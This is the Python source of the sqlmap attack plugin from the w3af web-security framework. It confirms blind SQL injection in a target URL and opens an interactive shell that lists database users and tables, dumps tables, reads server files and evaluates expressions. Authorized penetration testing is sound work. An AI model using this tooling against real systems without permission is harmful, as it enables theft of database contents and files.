'''
sqlmap.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''
import core.controllers.output_manager as om
import core.data.kb.knowledge_base as kb

from core.data.kb.shell import shell as shell
from core.data.request.HTTPPostDataRequest import HTTPPostDataRequest
from core.data.request.HTTPQsRequest import HTTPQSRequest
from core.data.fuzzer.fuzzer import create_mutants
from core.data.parsers.url import parse_qs
from core.data.options.opt_factory import opt_factory
from core.data.options.option_list import OptionList

from core.controllers.plugins.attack_plugin import AttackPlugin
from core.controllers.exceptions import w3afException
from core.controllers.sql_tools.blind_sqli_response_diff import blind_sqli_response_diff
from core.controllers.threads.threadManager import thread_manager as tm

from plugins.attack.db.dbDriverBuilder import dbDriverBuilder as dbDriverBuilder


SQLMAPCREATORS = 'sqlmap coded by inquis <bernardo.damele@gmail.com> and belch <daniele.bellucci@gmail.com>'


class sqlmap(AttackPlugin):
    '''
    Exploits [blind] sql injections using sqlmap ( http://sqlmap.sf.net ).
    '''
    #Plugin author:
    #@author: Andres Riancho (andres.riancho@gmail.com)
    
    #sqlmap authors:
    #@author: Bernardo Damele (inquis) - maintainer
    #@author: Daniele Bellucci (belch) - initial author
        
    def __init__(self):
        AttackPlugin.__init__(self)
        
        # Internal variables
        self._vuln = None
        self._driver = None
        
        # User configured options for fastExploit
        self._url = 'http://host.tld/'
        self._method = 'GET'
        self._data = ''
        self._injvar = ''
        
        # User configured variables
        self._eq_limit = 0.9
        self._goodSamaritan = True
        self._generate_only_one = True
        
    def fastExploit(self):
        '''
        Exploits a web app with [blind] sql injections vulns.
        The options are configured using the plugin options and set_options() method.
        '''
        om.out.debug('Starting sqlmap fastExploit.')
        om.out.console(SQLMAPCREATORS)
        
        if self._url is None or self._method is None or self._data is None or self._injvar is None:
            raise w3afException('You have to configure the plugin parameters')
        else:
            
            freq = None
            if self._method == 'POST':
                freq = HTTPPostDataRequest(self._url)
            elif self._method == 'GET':
                freq = HTTPQSRequest(self._url)
            else:
                raise w3afException('Method not supported.')
            
            freq.set_dc(parse_qs(self._data))
            
            bsql = blind_sqli_response_diff(self._uri_opener)
            bsql.set_eq_limit(self._eq_limit)
            
            fake_mutants = create_mutants(freq, [''], fuzzable_param_list=[self._injvar,])
            for mutant in fake_mutants:            
                vuln_obj = bsql.is_injectable(mutant)
                if vuln_obj is not None:
                    om.out.console('SQL injection verified, trying to create the DB driver.')
                    
                    # Try to get a shell using all vuln
                    msg = 'Trying to exploit using vulnerability with id: ' + str(vuln_obj.getId())
                    msg += '. Please wait...'
                    om.out.console(msg)
                    shell_obj = self._generate_shell(vuln_obj)
                    if shell_obj is not None:
                        kb.kb.append(self, 'shell', shell_obj)
                        return [shell_obj, ]
            else:    
                raise w3afException('No exploitable vulnerabilities found.')

        
    def getAttackType(self):
        '''
        @return: The type of exploit, SHELL, PROXY, etc.
        '''        
        return 'shell'
    
    def getExploitableVulns(self):
        vulns = list(kb.kb.get('blind_sqli', 'blind_sqli'))
        vulns.extend(kb.kb.get('sqli', 'sqli'))
        return vulns

    def canExploit( self, vulnToExploit=None ):
        '''
        Searches the kb for vulnerabilities that the plugin can exploit.

        @return: True if plugin knows how to exploit a found vuln.
        '''
        vulns = self.getExploitableVulns()

        if vulnToExploit is not None:
            vulns = [ v for v in vulns if v.getId() == vulnToExploit ]
            
        if len(vulns) != 0:
            return True
        else:
            om.out.console( 'No [blind] SQL injection vulnerabilities have been found.' )
            om.out.console( 'Hint #1: Try to find vulnerabilities using the audit plugins.' )
            msg = 'Hint #2: Use the set command to enter the values yourself, and then exploit it using fastExploit.'
            om.out.console( msg )
            return False

    def exploit( self, vulnToExploit=None ):
        '''
        Exploits a [blind] sql injections vulns that was found and stored in the kb.

        @return: True if the shell is working and the user can start calling specific_user_input
        '''
        if not self.canExploit():
            return []
        else:
            vulns = kb.kb.get( 'blind_sqli' , 'blind_sqli' )
            vulns.extend( kb.kb.get( 'sqli' , 'sqli' ) )
            
            bsql = blind_sqli_response_diff(self._uri_opener)
            bsql.set_eq_limit(self._eq_limit)
            
            tmp_vuln_list = []
            for v in vulns:
            
                # Filter the vuln that was selected by the user
                if vulnToExploit is not None:
                    if vulnToExploit != v.getId():
                        continue
            
                mutant = v.get_mutant()
                mutant.set_mod_value( mutant.get_original_value() )
                v.set_mutant( mutant )
            
                # The user didn't selected anything, or we are in the selected vuln!
                om.out.debug('Verifying vulnerability in URL: "' + v.getURL() + '".')
                vuln_obj = bsql.is_injectable( v.get_mutant() )
                
                if vuln_obj:
                    tmp_vuln_list.append( vuln_obj )
            
            # Ok, go to the next stage with the filtered vulnerabilities
            vulns = tmp_vuln_list
            if len(vulns) == 0:
                om.out.debug('is_injectable failed for all vulnerabilities.')
                return []
            else:
                for vuln_obj in vulns:
                    # Try to get a shell using all vuln
                    msg = 'Trying to exploit using vulnerability with id: ' + str( vuln_obj.getId() )
                    msg += '. Please wait...' 
                    om.out.console( msg )
                    shell_obj = self._generate_shell( vuln_obj )
                    if shell_obj:
                        if self._generate_only_one:
                            # A shell was generated, I only need one point of exec.
                            return [shell_obj, ]
                        else:
                            # Keep adding all shells to the kb
                            pass
                
                # FIXME: Am I really saving anything here ?!?!
                return kb.kb.get( self.get_name(), 'shell' )
                
    def _generate_shell( self, vuln_obj ):
        '''
        @param vuln_obj: The vuln to exploit, as it was saved in the kb or supplied by the user with set commands.
        @return: A sqlmap shell object if sqlmap could fingerprint the database.
        '''
        bsql = blind_sqli_response_diff(self._uri_opener)
        bsql.set_eq_limit( self._eq_limit )
            
        dbBuilder = dbDriverBuilder( self._uri_opener, bsql.equal_with_limit )
        driver = dbBuilder.getDriverForVuln( vuln_obj )
        if driver is None:
            return None
        else:
            # Create the shell object
            shell_obj = sqlShellObj( vuln_obj )
            shell_obj.setGoodSamaritan( self._goodSamaritan )
            shell_obj.setDriver( driver )
            kb.kb.append( self, 'shells', shell_obj )
            return shell_obj

    def get_options( self ):
        '''
        @return: A list of option objects for this plugin.
        '''
        ol = OptionList()
        d = 'URL to exploit with fastExploit()'
        o = opt_factory('url', self._url, d, 'url')
        ol.add(o)
        
        d = 'Method to use with fastExploit()'
        o = opt_factory('method', self._method, d, 'string')
        ol.add(o)
        
        d = 'Data to send with fastExploit()'
        o = opt_factory('data', self._data, d, 'string')
        ol.add(o)
        
        d = 'Variable where to inject with fastExploit()'
        o = opt_factory('injvar', self._injvar, d, 'string')
        ol.add(o)
        
        d = 'String equal ratio (0.0 to 1.0)'
        h = 'Two pages are equal if they match in more than equalLimit. Only used when'
        h += ' equAlgorithm is set to setIntersection.'
        o = opt_factory('equalLimit', self._eq_limit, d, 'float', help=h)
        ol.add(o)
        
        d = 'Enable or disable the good samaritan module'
        h = 'The good samaritan module is a the best way to speed up blind sql exploitations.'
        h += ' It\'s really simple, you see messages in the console that show the status of the'
        h += ' crawl and you can help the process. For example, if you see "Micros" you'
        h += ' could type "oft", and if it\'s correct, you have made your good action of the day'
        h += ', speeded up the crawl AND had fun doing it.'
        o = opt_factory('goodSamaritan', self._goodSamaritan, d, 'boolean', help=h)
        ol.add(o)
        
        d = 'If true, this plugin will try to generate only one shell object.'
        o = opt_factory('generateOnlyOne', self._generate_only_one, d, 'boolean')
        ol.add(o)        
        

        return ol


    def set_options( self, options_list ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of get_options().
        
        @param options_list: A map with the options for the plugin.
        @return: No value is returned.
        '''
        self._url = options_list['url'].get_value().uri2url()
            
        if options_list['method'].get_value() not in ['GET', 'POST']:
            raise w3afException('Unknown method.')
        else:
            self._method = options_list['method'].get_value()

        self._data = options_list['data'].get_value()
        self._injvar = options_list['injvar'].get_value()
        self._eq_limit = options_list['equalLimit'].get_value()
        self._goodSamaritan = options_list['goodSamaritan'].get_value()
        self._generate_only_one = options_list['generateOnlyOne'].get_value()

    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell
                 using this attack plugin. This is used by the "exploit *"
                 function to order the plugins and first try to exploit the
                 more critical ones. This method should return 0 for an exploit
                 that will never return a root shell, and 1 for an exploit that
                 WILL ALWAYS return a root shell.
        '''
        return 0.1

    def get_long_desc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits [blind] sql injections.
        
        The original sqlmap program was coded by Bernardo Damele and Daniele Bellucci, many thanks to both of
        them.
        
        Five configurable parameters exist:
            - url
            - method
            - data
            - injvar
            - equalLimit
        '''

class sqlShellObj(shell):
    
    def setDriver( self, driver ):
        '''
        @param driver: The DB driver from sqlmap.
        '''
        self._driver = driver
    
    def setGoodSamaritan( self, good_samaritan ):
        '''
        @param good_samaritan: A boolean that indicates if we are going to use it or not.
        '''
        self._goodSamaritan = good_samaritan
    
    def specific_user_input( self, command, parameters ):
        '''
        This method is called when a user writes a command in the shell and hits enter.
        
        Before calling this method, the framework calls the generic_user_input method
        from the shell class.

        @param command: The command to handle ( ie. "dbs", "users", etc ).
        @param parameters: A list with the parameters for @command
        @return: The result of the command.
        '''
        if not self._driver:
            raise w3afException('No driver could be created.')
        
        _method_map = {}
        _method_map['fingerprint'] = self._driver.getFingerprint
        _method_map['banner'] = self._driver.getBanner
        _method_map['current-user'] = self._driver.getCurrentUser
        _method_map['current-db'] = self._driver.getCurrentDb
        _method_map['users'] = self._driver.getUsers
        _method_map['dbs'] = self._driver.getDbs
        _method_map['tables'] = self._driver.auxGetTables
        _method_map['columns'] = self._driver.auxGetColumns
        _method_map['dump'] = self._driver.auxDump
        _method_map['file'] = self._driver.getFile
        _method_map['expression'] = self._driver.getExpr
        _method_map['union-check'] = self._driver.unionCheck
        _method_map['help'] = self.help
    
        if command in _method_map:
            method = _method_map[ command ]
        else:
            if self._goodSamaritan and self._driver.isRunningGoodSamaritan():
                self._driver.goodSamaritanContribution( command )
                return None
            else:
                om.out.console('Unknown command: "%s". Please read the help:' % command)
                self.help()
                return ''

        tm.apply_async( target=self._runCommand, args=(method, command, parameters), ownerObj=self, restrict=False )
        #self._runCommand(method, command)
        return None
            
    def _runCommand( self, method, command, parameters ):
        args = tuple( parameters )

        if self._goodSamaritan and command.strip() != 'help':
            self._driver.startGoodSamaritan()
        
        try:
            res = apply( method, args )
        except TypeError:
            res = 'Invalid number of parameters for command.'
        except KeyboardInterrupt, k:
            res = 'The user interrupted the process with Ctrl+C.'
        except w3afException, e:
            res = 'An unexpected error was found while trying to run the specified command.\n'
            res +='Exception: "' + str(e) + '"'
        else:            
            res = self._driver.dump.dump( command, args, res )
            res = res.replace('\n','\r\n')

        # Always stop the good samaritan
        self._driver.stopGoodSamaritan() 
        om.out.console( '\r\n' + res )
        self._showPrompt()

    def _showPrompt( self ):
        om.out.console('w3af/exploit/'+self.get_name()+'-'+str(self.getExploitResultId())+'>>>', newLine = False)
        
    def help( self, command='' ):
        '''
        Print the help to the user.
        '''
        om.out.console('')
        om.out.console( SQLMAPCREATORS )
        om.out.console('fingerprint             perform an exaustive database fingerprint')
        om.out.console('banner                  get database banner')
        om.out.console('current-user            get current database user')
        om.out.console('current-db              get current database name')
        om.out.console('users                   get database users')
        om.out.console('dbs                     get available databases')
        om.out.console('tables [db]             get available databases tables (optional: database)')
        om.out.console('columns <table> [db]    get table columns (required: table optional: database)')
        om.out.console('dump <table> [db]       dump a database table (required: -T optional: -D)')
        om.out.console('file <FILENAME>         read a specific file content')
        om.out.console('expression <EXPRESSION> expression to evaluate')
        om.out.console('union-check             check for UNION sql injection')
        self._showPrompt()
        return True
    
    def _identifyOs( self ):
        # hmmm....
        self._rSystem = self._rSystemName = self._dbms = self._driver.getFingerprint()
        self._rUser = self._driver.getCurrentUser()
    
    def getRemoteSystem( self ):
        return self._dbms

    def __repr__( self ):
        if not self._rOS:
            self._identifyOs()
        return '<sql object ( dbms: "'+self._dbms+'" | ruser: "'+ self._rUser +'" )>'
        
    __str__ = __repr__
    def end( self ):
        om.out.debug('sqlmap cleanup complete.')
            
    def get_name( self ):
        return 'sqlmap'
        
    def end_interaction(self):
        '''
        When the user executes "exit" in the console, this method is called.
        Basically, here we handle WHAT TO DO in that case. In most cases (and this is
        why we implemented it this way here) the response is "yes, do it end me" that
        equals to "return True".
        
        In some other cases, the shell prints something to the console and then exists,
        or maybe some other, more complex, thing.
        '''
        if self._goodSamaritan and self._driver.isRunningGoodSamaritan():
            # Keep the user locked inside this shell until the good samaritan ain't working
            # anymore
            #print 'a' * 33
            return False
        else:
            # Exit this shell
            return True
